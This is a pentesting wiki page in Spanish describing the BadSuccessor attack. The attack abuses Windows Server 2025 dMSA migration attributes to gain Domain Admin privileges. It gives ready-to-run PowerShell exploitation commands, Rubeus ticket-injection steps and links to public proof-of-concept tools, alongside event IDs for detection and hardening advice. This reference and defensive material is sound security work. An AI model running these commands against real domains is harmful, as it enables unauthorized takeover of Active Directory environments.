# BadSuccessor: Escalación de Privilegios a través del Abuso de Migración de dMSA Delegados

{{#include ../../banners/hacktricks-training.md}}

## Descripción General

Las Cuentas de Servicio Administradas Delegadas (**dMSA**) son el sucesor de próxima generación de **gMSA** que se incluyen en Windows Server 2025. Un flujo de trabajo de migración legítimo permite a los administradores reemplazar una cuenta *antigua* (cuenta de usuario, computadora o servicio) con un dMSA mientras se preservan las permisos de manera transparente. El flujo de trabajo se expone a través de cmdlets de PowerShell como `Start-ADServiceAccountMigration` y `Complete-ADServiceAccountMigration` y se basa en dos atributos LDAP del **objeto dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* a la cuenta supersedida (antigua).
* **`msDS-DelegatedMSAState`**       – estado de migración (`0` = ninguno, `1` = en progreso, `2` = *completado*).

Si un atacante puede crear **cualquier** dMSA dentro de una OU y manipular directamente esos 2 atributos, LSASS y el KDC tratarán al dMSA como un *sucesor* de la cuenta vinculada. Cuando el atacante se autentica posteriormente como el dMSA **hereda todos los privilegios de la cuenta vinculada** – hasta **Administrador de Dominio** si la cuenta de Administrador está vinculada.

Esta técnica fue acuñada como **BadSuccessor** por Unit 42 en 2025. En el momento de escribir esto, **no hay ningún parche de seguridad** disponible; solo el endurecimiento de los permisos de la OU mitiga el problema.

### Requisitos Previos del Ataque

1. Una cuenta que esté *permitida* para crear objetos dentro de **una Unidad Organizativa (OU)** *y* tenga al menos uno de:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** clase de objeto
* `Create Child` → **`All Objects`** (creación genérica)
2. Conectividad de red a LDAP y Kerberos (escenario estándar de dominio unido / ataque remoto).

## Enumerando OUs Vulnerables

Unit 42 lanzó un script auxiliar de PowerShell que analiza los descriptores de seguridad de cada OU y resalta los ACEs requeridos:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Bajo el capó, el script ejecuta una búsqueda LDAP paginada para `(objectClass=organizationalUnit)` y verifica cada `nTSecurityDescriptor` por

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (clase de objeto *msDS-DelegatedManagedServiceAccount*)

## Pasos de Explotación

Una vez que se identifica una OU escribible, el ataque está a solo 3 escrituras LDAP de distancia:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Después de la replicación, el atacante puede simplemente **logon** como `attacker_dMSA$` o solicitar un TGT de Kerberos; Windows construirá el token de la cuenta *superseded*.

### Automatización

Varios PoCs públicos envuelven todo el flujo de trabajo, incluyendo la recuperación de contraseñas y la gestión de tickets:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* Módulo NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Post-Explotación
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detección y Caza

Habilite **Auditoría de Objetos** en OUs y monitoree los siguientes Eventos de Seguridad de Windows:

* **5137** – Creación del objeto **dMSA**
* **5136** – Modificación de **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Cambios específicos de atributos
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Emisión de TGT para el dMSA

Correlacionar `4662` (modificación de atributo), `4741` (creación de una cuenta de computadora/servicio) y `4624` (inicio de sesión posterior) resalta rápidamente la actividad de BadSuccessor. Las soluciones XDR como **XSIAM** vienen con consultas listas para usar (ver referencias).

## Mitigación

* Aplique el principio de **menor privilegio** – solo delegue la gestión de *Cuentas de Servicio* a roles de confianza.
* Elimine `Create Child` / `msDS-DelegatedManagedServiceAccount` de OUs que no lo requieran explícitamente.
* Monitoree los ID de eventos listados arriba y alerte sobre identidades *no-Tier-0* que creen o editen dMSAs.

## Véase también

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Referencias

- [Unit42 – Cuando las Buenas Cuentas se Vuelven Malas: Explotando Cuentas de Servicio Administradas Delegadas](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Colección de Herramientas de Pentest](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [Módulo BadSuccessor de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
